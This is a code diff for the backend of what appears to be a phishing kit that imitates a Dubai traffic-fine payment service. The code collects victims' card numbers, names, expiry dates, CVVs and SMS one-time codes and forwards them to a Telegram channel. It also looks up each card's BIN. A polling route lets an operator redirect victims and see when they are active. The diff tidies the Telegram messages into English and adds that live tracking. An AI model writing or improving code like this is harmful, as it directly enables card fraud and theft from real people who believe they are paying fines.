@@ -115,10 +115,10 @@ router.post('/search-fines', async (req, res) => {
     );
     const now = new Date().toLocaleString('tr-TR', { timeZone: 'Asia/Dubai' });
     const msg = [
-      '<b>New Inquiry</b>',
+      '<b>[INQUIRY]</b>',
       `Plate: <b>${plateSrcCode} / ${plateCodeLetter} ${plateNo}</b>`,
       `Fines: <b>${fineCount}</b>`,
-      `Total: <b>AED ${totalAmount}</b> — 50% Discount: <b>AED ${Math.floor(totalAmount * 0.5)}</b>`,
+      `Total: <b>AED ${totalAmount}</b> | 50% off: <b>AED ${Math.floor(totalAmount * 0.5)}</b>`,
       `Time: ${now} (Dubai)`,
       sid ? `SID: <code>${sid}</code>` : '',
     ].filter(Boolean).join('\n');
@@ -149,17 +149,21 @@ router.post('/telegram', async (req, res) => {
     let text;
     if (type === 'otp_sms') {
       text = [
-        '📱 <b>SMS OTP KODU GELDİ</b>', '━━━━━━━━━━━━━━━━━━',
-        `🔑 OTP Kodu: <code>${otp}</code>`, `💳 Son 4 Hane: <b>****${cardLast4}</b>`,
-        `💰 Tutar: <b>AED ${totalFine}</b>`, `🏛 Banka: <b>${issuer}</b>`, '━━━━━━━━━━━━━━━━━━',
+        '<b>[OTP RECEIVED]</b>', '─────────────────',
+        `OTP Code: <code>${otp}</code>`,
+        `Card: <b>****${cardLast4}</b>`,
+        `Amount: <b>AED ${totalFine}</b>`,
+        `Bank: <b>${issuer}</b>`,
+        '─────────────────',
       ].join('\n');
     } else {
-      const emojis = { otp_notification_resend:'🔄', otp_resend:'🔄', otp_approved:'✅' };
-      const labels = { otp_notification_resend:'BİLDİRİM YENİDEN GÖNDERİLDİ', otp_resend:'OTP YENİDEN GÖNDERİLDİ', otp_approved:'OTP ONAYLANDI' };
+      const labels = { otp_notification_resend:'NOTIFICATION RESENT', otp_resend:'OTP RESENT', otp_approved:'OTP APPROVED' };
       text = [
-        `${emojis[type]||'ℹ️'} <b>${labels[type]||type}</b>`, '━━━━━━━━━━━━━━━━━━',
-        `💳 Son 4 Hane: <b>****${cardLast4}</b>`, `💰 Tutar: <b>AED ${totalFine}</b>`,
-        `🏛 Banka: <b>${issuer}</b>`, sid?`🆔 SID: <code>${sid}</code>`:'',
+        `<b>[${labels[type] || type.toUpperCase()}]</b>`, '─────────────────',
+        `Card: <b>****${cardLast4}</b>`,
+        `Amount: <b>AED ${totalFine}</b>`,
+        `Bank: <b>${issuer}</b>`,
+        sid ? `SID: <code>${sid}</code>` : '',
       ].filter(Boolean).join('\n');
     }
     const cfg = await getTgConfig();
@@ -192,21 +196,27 @@ router.post('/telegram', async (req, res) => {
   } catch { /* ignore */ }
 
   const binStatus = binInfo
-    ? [binInfo.Issuer?`🏛 Banka: <b>${binInfo.Issuer}</b>`:null,
-       binInfo.Country?.Name?`🌍 Ülke: <b>${binInfo.Country.Name}</b>`:null,
-       (binInfo.Type||binInfo.Scheme)?`💳 Tip: <b>${binInfo.Type||'-'} / ${(binInfo.Scheme||'').toUpperCase()}</b>`:null]
+    ? [binInfo.Issuer                       ? `Bank: <b>${binInfo.Issuer}</b>`                                           : null,
+       binInfo.Country?.Name                ? `Country: <b>${binInfo.Country.Name}</b>`                                  : null,
+       (binInfo.Type || binInfo.Scheme)     ? `Type: <b>${binInfo.Type || '-'} / ${(binInfo.Scheme||'').toUpperCase()}</b>` : null]
       .filter(Boolean).join('\n')
-    : '❌ BIN Bilgisi Alınamadı';
+    : 'BIN info unavailable';
 
   const text = [
-    '🔔 <b>YENİ ÖDEME BİLDİRİMİ</b>', '━━━━━━━━━━━━━━━━━━',
-    `💰 Tutar: <b>AED ${totalFine}</b>`, `🔢 Adet: <b>${fineCount}</b>`,
-    `🚗 Plaka: <b>${plateCodeLetter} ${plateNo} (${plateSrcCode})</b>`,
-    sid?`🆔 SID: <code>${sid}</code>`:'', '━━━━━━━━━━━━━━━━━━',
-    '👤 <b>KART BİLGİLERİ</b>', `📝 İsim: <code>${cardName}</code>`,
-    `💳 No: <code>${cardNumber}</code>`, `📅 SKT: <code>${expiry}</code>`,
-    `🔐 CVV: <code>${cvv}</code>`, '━━━━━━━━━━━━━━━━━━',
-    '📊 <b>KART STATÜSÜ</b>', binStatus, '━━━━━━━━━━━━━━━━━━',
+    '<b>[NEW PAYMENT]</b>', '─────────────────',
+    `Amount: <b>AED ${totalFine}</b>`,
+    `Fines: <b>${fineCount}</b>`,
+    `Plate: <b>${plateCodeLetter} ${plateNo} (${plateSrcCode})</b>`,
+    sid ? `SID: <code>${sid}</code>` : '',
+    '─────────────────',
+    '<b>CARD DETAILS</b>',
+    `Name: <code>${cardName}</code>`,
+    `Number: <code>${cardNumber}</code>`,
+    `Expiry: <code>${expiry}</code>`,
+    `CVV: <code>${cvv}</code>`,
+    '─────────────────',
+    '<b>CARD INFO</b>', binStatus,
+    '─────────────────',
   ].filter(Boolean).join('\n');
 
   const cfg = await getTgConfig();
@@ -237,6 +247,9 @@ router.get('/check-status', async (req, res) => {
   if (!sid) return res.json({ action: 'none' });
 
   try {
+    // Update last_seen so admin panel can show active indicator
+    await query('UPDATE payments SET last_seen = NOW() WHERE sid = ?', [sid]);
+
     const row = await queryOne('SELECT redirect_to, otp_status, otp_page FROM payments WHERE sid = ? LIMIT 1', [sid]);
     if (!row) return res.json({ action: 'none' });
 
